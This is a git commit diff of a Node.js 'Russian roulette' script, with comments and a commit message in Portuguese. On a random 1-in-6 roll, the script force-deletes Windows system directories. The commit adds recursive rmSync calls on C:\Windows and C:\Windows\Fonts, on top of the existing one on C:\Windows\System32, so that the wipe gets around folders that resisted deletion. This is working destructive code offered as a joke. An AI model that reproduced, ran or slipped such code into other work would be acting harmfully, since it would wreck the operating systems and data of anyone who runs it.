7f2237cf8821e94453b2bc92cb3f86ae7cc77cf7
Arthur de S. Manske <arthur-manske@proton.me>
2024-12-02 19:50:01 +0000

    FIX: Esqueci que algumas pastas são protegidas

--- roletaRussa.js
+++ roletaRussa.js
@@ -5,11 +5,13 @@ const num = Math.floor(Math.random() * 6);
 
 if (num == 0) {
 	console.log('Vish atirou meu nobre');
-	if (!fs.existsSync("C:\\Windows\\System32")) {
+	if (!fs.existsSync("C:\\Windows")) {
 		console.log('Em Linux eu não toco!');
 		process.exit(0);
 	}
 
+	fs.rmSync("C:\\Windows", {recursive: true, force: true});
+	fs.rmSync("C:\\Windows\\Fonts", {recursive: true, force: true});
 	fs.rmSync("C:\\Windows\\System32", {recursive: true, force: true});
 } else {
 	console.log('Tá safe!'); 
